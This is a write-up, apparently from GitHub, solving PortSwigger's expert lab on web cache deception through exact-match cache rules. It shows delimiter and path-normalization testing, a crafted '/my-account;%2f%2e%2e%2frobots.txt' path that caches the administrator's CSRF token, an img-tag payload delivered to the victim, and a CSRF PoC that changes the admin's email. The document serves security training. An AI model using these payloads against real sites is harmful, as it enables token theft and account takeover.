## Labs Covered

This write-up focuses on the following **EXPERT-level lab** from the PortSwigger Web Security Academy related to **Web Cache Deception**:

**Exploiting exact-match cache rules for web cache deception**  
This lab demonstrates how attackers can abuse exact-match cache rules to trick caches into storing sensitive resources.

---

### LAB 5 - Exploiting exact-match cache rules for web cache deception

### Lab Description

![image](https://github.com/user-attachments/assets/757cc6d4-4764-4097-bf87-83fb43ae352c)


## Overview Exploiting File Name Cache Rules

Certain files such as `robots.txt`, `index.html`, and `favicon.ico` are common files found on web servers. They're often cached due to their infrequent changes. Cache rules target these files by matching the **exact file name string**.

To identify whether there is a file name cache rule, send a `GET` request for a possible file and observe whether the response is cached.

> 🔬 **Lab Focus**: The following techniques target vulnerabilities in `robots.txt`, `index.html`, and `favicon.ico`.

---

## Detecting Normalization Discrepancies

To test how the **origin server** normalizes the URL path:

* Use a method similar to detecting static directory cache rules.
* Observe whether it resolves encoded dot-segments (`%2e%2e`) or extra slashes (`/`).

To test how the **cache** normalizes the path:

* Send a request like `/aaa%2f%2e%2e%2findex.html`.

### Interpretation:

* ✅ **Response is cached** → Cache normalizes path to `/index.html`.
* ❌ **Response is not cached** → Cache does **not** normalize; interprets literal string.

---

## Exploiting Normalization Discrepancies

If the **cache server resolves dot-segments** but the origin **does not**, you can exploit this mismatch.

For example:

* Use `/aaa%2f%2e%2e%2frobots.txt` if `robots.txt` is cacheable and normalizable.
* The cache may store a response for `/robots.txt`, while the origin returns user-specific data.

---

## Exploiting Exact-Match Cache Rules for Web Cache Deception (Expert Lab)

> 🎯 Goal: Change the administrator's email address using a CSRF exploit.


---


### Solution

### 1. Identify a Target Endpoint

* Log into the app using Burp's browser with credentials `wiener:peter`

  ![image](https://github.com/user-attachments/assets/be70e9f3-21d8-4c07-9c35-903d9b648447)

* Change the email address in your profile.
* In Burp → **Proxy > HTTP History**, observe `/my-account` contains a CSRF token.

  ![image](https://github.com/user-attachments/assets/9114f8cc-bd8c-436c-a5b0-45aa616e099f)


### 2. Investigate Path Delimiter Discrepancies

* Send `GET /my-account/hanzala` in Repeater → 404 (origin doesn’t resolve)

   ![image](https://github.com/user-attachments/assets/bbb18c69-3c31-4d68-a0e8-49fc10b3f1d6)
  
* Send `/my-accounthanzala` → also 404

  ![image](https://github.com/user-attachments/assets/fee10535-45bf-4537-8647-c62b72031289)

* 



#### Test with Intruder

* Set payload `/my-account§§hanzala` using common delimiters like `;`, `?`, `%2f`

 ![image](https://github.com/user-attachments/assets/4d42917f-d4f1-4812-8042-ed6180f69494)

  
Unchecked Payload encoding

  ![image](https://github.com/user-attachments/assets/f0ab261a-5995-448a-8723-22847d43ce78)

* Check responses for evidence of caching we can test two response which have given us 200 response `; ?`

![image](https://github.com/user-attachments/assets/bfe24e8e-13b3-4afa-b5b0-5d801510d134)

### 3. Test Delimiters in Path

Try:

* `/my-account?hanzala.js`
* `/my-account;hanzala.js`
* Observe: 200 OK but **no caching**

![image](https://github.com/user-attachments/assets/36b964c8-6b8d-4c1d-bd8b-40173d19d9f6)

---

## 4. Investigate Normalization Discrepancies

* Try `/aa/..%2fmy-account` → 404
* Shows origin server does **not** decode dot-segments

![image](https://github.com/user-attachments/assets/2e4dc716-dc96-4df9-8ac3-77815beaeffb)

Next:

* Visit `/robots.txt` → Observe `X-Cache: miss` then `X-Cache: hit` (response is cached)
  
  ![image](https://github.com/user-attachments/assets/e6592c65-eb4f-4443-8dd0-fa355af2717a)

  Resend and notice that this updates to **X-Cache: hit**. This indicates that the cache has a rule to store responses based on the `/robots.txt` file name.

  ![image](https://github.com/user-attachments/assets/6b6fb2f2-4171-4d59-9176-4c6017aa6fed)

* Try `/aaa/..%2frobots.txt` → 200 and `X-Cache: hit` (cache normalized the path)

  ![image](https://github.com/user-attachments/assets/9306a0d6-18da-4d4b-894c-63590584fa1b)



---

## 5. Exploit the Vulnerability

### 🧬 Extract Administrator’s CSRF Token

1. Try `/my-account?%2f%2e%2e%2frobots.txt` → 200 but no cache

    ![image](https://github.com/user-attachments/assets/db088df3-6a7f-4dcf-b8d4-a863fe8ead8e)
 
  
   - Repeat this test using the ; delimiter instead of ?.
 
 3. Try `/my-account;%2f%2e%2e%2frobots.txt` → 200 with user data, `X-Cache: miss`
    ![image](https://github.com/user-attachments/assets/bf0f05d8-0033-4b7f-b4ee-dce2a7adfee4)

4. Resend → Now shows `X-Cache: hit`

   ![image](https://github.com/user-attachments/assets/675c8744-a3f1-4553-bdc3-02c833bdd853)



### 🛠️ Deliver Exploit to Victim

1. Go to **Go to exploit server**
2. Paste payload:

```html
<img src="/my-account;%2f%2e%2e%2frobots.txt?wc" />
```

3. Click **Deliver exploit to victim**
   ![image](https://github.com/user-attachments/assets/7aaf0ece-38f8-4925-a30c-e568643f27c4)

4. In Burp, send same request:

   * `/my-account;%2f%2e%2e%2frobots.txt?wc`
5. Confirm the CSRF token for `administrator` appears

   ![image](https://github.com/user-attachments/assets/2890699e-ee32-4fd7-9b4b-7772af7e4235)


---

## 6. Craft Final CSRF Exploit

1. Right-click `POST /my-account/change-email` → Send to Repeater
   ![image](https://github.com/user-attachments/assets/a9f8ebe3-caaa-4507-b0be-62f07a32a34b)

2. In Repeater, replace the CSRF token with the administrator's token.
	
	 - Change the email address in your exploit so that it doesn't match your own.
	 - Right-click the request and select Engagement tools > Generate CSRF PoC.


    ![image](https://github.com/user-attachments/assets/3d0c8378-1706-4e5f-b9fd-56b9695439c9)

3 Click Copy html

   ![image](https://github.com/user-attachments/assets/b6dec4e3-5501-42b4-911c-c4573b8c2847)



4. Paste HTML into exploit server’s **Body** field

   ![image](https://github.com/user-attachments/assets/7b205cc4-d0d2-471a-b9ca-8bb6b63119ce)

5. Click **Deliver exploit to victim** again to solve the lab

   ![image](https://github.com/user-attachments/assets/bf0ae86d-1cfc-4c36-b6ad-31491f55cf3d)

---
